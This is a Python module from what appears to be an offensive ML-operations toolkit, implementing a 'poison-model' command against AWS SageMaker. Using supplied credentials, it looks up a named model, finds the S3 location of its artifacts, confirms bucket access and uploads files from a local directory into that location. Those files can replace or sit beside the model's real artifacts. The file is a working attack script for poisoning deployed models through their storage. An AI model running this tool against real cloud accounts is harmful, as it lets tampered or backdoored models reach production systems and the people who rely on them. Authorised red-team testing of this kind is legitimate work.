import os
 
from pymlokit.modules.sagemaker._aws import boto3_clients
from pymlokit.utils.arg_utils import generate_header
from pymlokit.utils.table import print_table
 
 
def _parse_s3_url(s3_url: str) -> tuple[str, str]:
     s = s3_url.strip()
     if not s.startswith("s3://"):
         raise ValueError("Invalid S3 URL")
     rest = s[5:]
     bucket, _, key = rest.partition("/")
     return bucket, key
 
 
def run(credential: str, platform: str, region: str, model_id: str, source_dir: str) -> None:
     print(generate_header("poison-model", platform))
 
     if not region or not model_id or not source_dir:
         print("")
         print("[-] ERROR: Missing one of required command arguments")
         print("")
         return
 
     print("")
     print(f"[*] INFO: Performing poison-model module for {platform}")
     print("")
     print("[*] INFO: Checking credentials provided")
     print("")
 
     sm, s3 = boto3_clients(credential, region)
     resp = sm.list_models(MaxResults=100)
     models = resp.get("Models", [])
     target = None
     for m in models:
         if str(m.get("ModelName", "")).lower() == model_id.lower():
             target = m
             break
 
     if not target:
         return
 
     print("[+] SUCCESS: Credentials are valid")
     print("")
     print_table(
         ["Model Name", "Creation Date", "Model ARN"],
         [
             [
                 target.get("ModelName", ""),
                 (target.get("CreationTime") or "").strftime("%m/%d/%Y") if hasattr(target.get("CreationTime"), "strftime") else "",
                 target.get("ModelArn", ""),
             ]
         ],
     )
     print("")
 
     desc = sm.describe_model(ModelName=target["ModelName"])
     containers = desc.get("Containers") or ([desc.get("PrimaryContainer")] if desc.get("PrimaryContainer") else [])
     model_data_url = ""
     for c in containers or []:
         if isinstance(c, dict) and c.get("ModelDataUrl"):
             model_data_url = str(c["ModelDataUrl"])
             break
     if not model_data_url:
         return
 
     print("[*] INFO: Model artifacts location")
     print("")
     print(model_data_url)
     print("")
 
     bucket, key = _parse_s3_url(model_data_url)
     prefix = "/".join(key.split("/")[:-1]) + "/"
 
     print(f"[*] INFO: Checking access to S3 bucket with name: {bucket}")
     print("")
     s3.get_bucket_versioning(Bucket=bucket)
     print(f"[+] SUCCESS: You have access to S3 bucket with name: {bucket}")
     print("")
 
     print(f"[*] INFO: Listing prefix where files will be uploaded: {prefix}")
     print("")
 
     print("[*] INFO: Listing files in source directory that will be uploaded")
     print("")
     files = [os.path.join(source_dir, f) for f in os.listdir(source_dir)]
     for fp in files:
         if os.path.isfile(fp):
             print(os.path.basename(fp))
     print("")
 
     for fp in files:
         if not os.path.isfile(fp):
             continue
         name = os.path.basename(fp)
         dest_key = prefix + name
         s3.upload_file(fp, bucket, dest_key)
         print(f"[+] SUCCESS: {name} written to:")
         print(f"{bucket}/{dest_key}")
         print("")
 
